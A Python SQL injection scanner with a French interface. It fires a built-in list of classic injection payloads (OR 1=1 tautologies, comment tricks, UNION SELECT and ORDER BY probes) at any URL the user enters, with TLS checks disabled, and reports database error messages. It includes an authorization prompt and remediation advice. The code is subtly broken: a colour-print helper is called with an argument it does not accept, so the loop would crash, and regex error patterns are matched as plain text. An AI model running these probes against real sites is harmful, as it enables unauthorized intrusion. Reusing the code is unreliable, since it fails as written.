import os
import sys
import time
import requests
from urllib.parse import urlparse, urljoin
from datetime import datetime

# Couleurs
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_red(text):
    print(f"{RED}{text}{RESET}")

def print_green(text):
    print(f"{GREEN}{text}{RESET}")

def print_yellow(text, end='\n'):
    print(f"{YELLOW}{text}{RESET}", end=end)

def print_cyan(text):
    print(f"{CYAN}{text}{RESET}")

def print_magenta(text):
    print(f"{MAGENTA}{text}{RESET}")

def ascii_banner():
    banner = """
╔═╗╔═╗╦    ╔═╗╔═╗╔═╗╔╗╔╔╗╔╔═╗╦═╗
╚═╗║═╬╝    ╚═╗║  ╠═╣║║║║║║║╣ ╠╦╝
╚═╝╚═╝╩═╝  ╚═╝╚═╝╩ ╩╝╚╝╝╚╝╚═╝╩╚═
  Scanner de Vulnérabilités SQL
    """
    return banner

# Payloads SQL Injection courants
SQL_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
]

# Messages d'erreur SQL typiques
ERROR_MESSAGES = [
    "SQL syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "PostgreSQL.*ERROR",
    "Warning.*mysql_.*",
    "valid MySQL result",
    "MySqlClient.",
    "com.mysql.jdbc.exceptions",
    "ORA-[0-9][0-9][0-9][0-9]",
    "Oracle error",
    "Microsoft SQL Native Client error",
    "ODBC SQL Server Driver",
    "SQLServer JDBC Driver",
    "SqlException",
    "Unclosed quotation mark",
    "syntax error",
    "unterminated quoted string",
]

def validate_url(url):
    """Valide l'URL"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def test_sql_injection(url, payload):
    """Teste une injection SQL avec un payload"""
    try:
        # Construit l'URL avec le payload
        if '?' in url:
            test_url = f"{url}{payload}"
        else:
            test_url = f"{url}?id={payload}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.get(test_url, headers=headers, timeout=10, verify=False)
        
        # Vérifie les erreurs SQL dans la réponse
        for error_msg in ERROR_MESSAGES:
            if error_msg.lower() in response.text.lower():
                return {
                    'vulnerable': True,
                    'payload': payload,
                    'error': error_msg,
                    'status_code': response.status_code,
                    'url': test_url
                }
        
        return {'vulnerable': False}
        
    except requests.exceptions.Timeout:
        return {'vulnerable': False, 'error': 'Timeout'}
    except Exception as e:
        return {'vulnerable': False, 'error': str(e)}

def scan_sql_vulnerabilities(url):
    """Scanner principal SQL"""
    
    clear()
    print_red(ascii_banner())
    print_red("\n" + "="*70)
    print_red(f"  URL cible: {url}")
    print_red(f"  Date: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    print_red("="*70 + "\n")
    
    # Validation
    if not validate_url(url):
        print_red("[!] URL invalide!")
        print_yellow("\n[*] Format attendu: https://example.com ou https://example.com?id=1")
        return
    
    print_green("[+] URL valide détectée")
    
    # Avertissement
    print_red("\n" + "="*70)
    print_red("                        AVERTISSEMENT")
    print_red("="*70)
    print_yellow("\n[!] Ce scanner est destiné aux tests de pénétration autorisés")
    print_yellow("[!] Scanner un site sans autorisation est ILLÉGAL")
    print_red("="*70 + "\n")
    
    choice = input(f"{YELLOW}[*] Avez-vous l'autorisation de scanner ce site? (o/n): {RESET}").strip().lower()
    
    if choice != 'o' and choice != 'oui':
        print_red("\n[!] Scan annulé. Autorisation requise.")
        time.sleep(2)
        return
    
    # Début du scan
    print_red("\n" + "="*70)
    print_red("                    DÉBUT DU SCAN SQL")
    print_red("="*70 + "\n")
    
    print_yellow(f"[*] Test de {len(SQL_PAYLOADS)} payloads SQL...\n")
    time.sleep(1)
    
    vulnerabilities = []
    
    for i, payload in enumerate(SQL_PAYLOADS, 1):
        print_cyan(f"[~] Test {i}/{len(SQL_PAYLOADS)}: ", end="")
        print_yellow(f"{payload[:30]}...", end="\r")
        
        result = test_sql_injection(url, payload)
        
        if result.get('vulnerable'):
            print_red(f"[!] VULNÉRABLE! Payload: {payload}")
            vulnerabilities.append(result)
        else:
            print_green(f"[✓] Test {i}/{len(SQL_PAYLOADS)}: Sécurisé")
        
        time.sleep(0.3)  # Délai pour éviter le rate limiting
    
    # Résultats
    print_red("\n" + "="*70)
    print_red("                    RÉSULTATS DU SCAN")
    print_red("="*70 + "\n")
    
    if vulnerabilities:
        print_red(f"[!] ALERTE: {len(vulnerabilities)} vulnérabilité(s) SQL détectée(s)!\n")
        
        for i, vuln in enumerate(vulnerabilities, 1):
            print_magenta(f"┌─ Vulnérabilité #{i}")
            print_cyan(f"│ Payload: {vuln['payload']}")
            print_cyan(f"│ Erreur détectée: {vuln['error']}")
            print_cyan(f"│ Code HTTP: {vuln['status_code']}")
            print_cyan(f"│ URL testée: {vuln['url'][:60]}...")
            print_magenta("│")
        
        print_red("\n[!] RECOMMANDATIONS:")
        print_cyan("  • Utilisez des requêtes préparées (Prepared Statements)")
        print_cyan("  • Validez et échappez toutes les entrées utilisateur")
        print_cyan("  • Utilisez un ORM (Object-Relational Mapping)")
        print_cyan("  • Appliquez le principe du moindre privilège sur la BDD")
        print_cyan("  • Désactivez les messages d'erreur détaillés en production")
        
    else:
        print_green("[✓] Aucune vulnérabilité SQL détectée!")
        print_cyan("[*] Le site semble correctement protégé contre les injections SQL")
        print_yellow("\n[*] Note: Ce scan est basique. Des tests plus approfondis peuvent révéler d'autres failles")
    
    # Types d'injections SQL
    print_red("\n" + "="*70)
    print_red("                  TYPES D'INJECTIONS SQL")
    print_red("="*70)
    print_yellow("\n[*] Types courants d'injections SQL:")
    print_cyan("  • In-band SQLi (Classic): Résultats dans la même réponse")
    print_cyan("  • Error-based SQLi: Exploitation des messages d'erreur")
    print_cyan("  • Union-based SQLi: Utilisation de UNION SELECT")
    print_cyan("  • Blind SQLi: Pas de retour visible, analyse du comportement")
    print_cyan("  • Time-based Blind SQLi: Utilisation de délais (SLEEP)")
    print_cyan("  • Out-of-band SQLi: Exploitation via canaux externes (DNS)")
    
    # Outils professionnels
    print_red("\n" + "="*70)
    print_red("                  OUTILS PROFESSIONNELS")
    print_red("="*70)
    print_yellow("\n[*] Pour des tests approfondis:")
    print_cyan("  • SQLMap: Outil automatisé de détection et exploitation")
    print_cyan("  • Havij: Scanner SQL injection (Windows)")
    print_cyan("  • jSQL Injection: Scanner multiplateforme")
    print_cyan("  • Burp Suite: Suite complète de tests de sécurité")
    print_cyan("  • OWASP ZAP: Scanner de sécurité open-source")
    
    # Sauvegarde
    if vulnerabilities:
        save_results(url, vulnerabilities)
    
    print_red("\n" + "="*70 + "\n")

def save_results(url, vulnerabilities):
    """Sauvegarde les résultats dans un fichier"""
    try:
        results_dir = "results"
        if not os.path.exists(results_dir):
            os.makedirs(results_dir)
        
        domain = urlparse(url).netloc.replace('.', '_')
        filename = f"{results_dir}/sql_scan_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("  LUNIX - SQL VULNERABILITY SCAN RESULTS\n")
            f.write(f"  URL cible: {url}\n")
            f.write(f"  Date: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")
            
            f.write(f"VULNÉRABILITÉS DÉTECTÉES: {len(vulnerabilities)}\n\n")
            
            for i, vuln in enumerate(vulnerabilities, 1):
                f.write(f"[Vulnérabilité #{i}]\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Erreur détectée: {vuln['error']}\n")
                f.write(f"Code HTTP: {vuln['status_code']}\n")
                f.write(f"URL testée: {vuln['url']}\n\n")
            
            f.write("\nRECOMMANDATIONS:\n")
            f.write("-" * 70 + "\n")
            f.write("• Utilisez des requêtes préparées (Prepared Statements)\n")
            f.write("• Validez et échappez toutes les entrées utilisateur\n")
            f.write("• Utilisez un ORM (Object-Relational Mapping)\n")
            f.write("• Appliquez le principe du moindre privilège sur la BDD\n")
            f.write("• Désactivez les messages d'erreur détaillés en production\n")
        
        print_green(f"\n[+] Résultats sauvegardés dans: {filename}")
        
    except Exception as e:
        print_red(f"\n[!] Erreur lors de la sauvegarde: {str(e)}")

def main():
    clear()
    print_red(ascii_banner())
    print_red("\n" + "="*70 + "\n")
    
    print_yellow("[!] AVERTISSEMENT LÉGAL")
    print_red("─" * 70)
    print_cyan("Ce scanner est destiné aux tests de sécurité AUTORISÉS uniquement.")
    print_cyan("Scanner un site sans permission est ILLÉGAL.")
    print_cyan("Vous êtes responsable de vos actions.")
    print_red("─" * 70)
    
    url = input(f"\n{RED}[*] Entrez l'URL à scanner: {RESET}").strip()
    
    if not url:
        print_red("\n[!] Erreur: Veuillez entrer une URL valide!")
        time.sleep(2)
        return
    
    # Ajoute https:// si manquant
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    print_red(f"\n[*] Préparation du scan...\n")
    time.sleep(1)
    
    # Désactive les warnings SSL
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    scan_sql_vulnerabilities(url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_red("\n\n[!] Scan interrompu par l'utilisateur.")
        sys.exit(0)
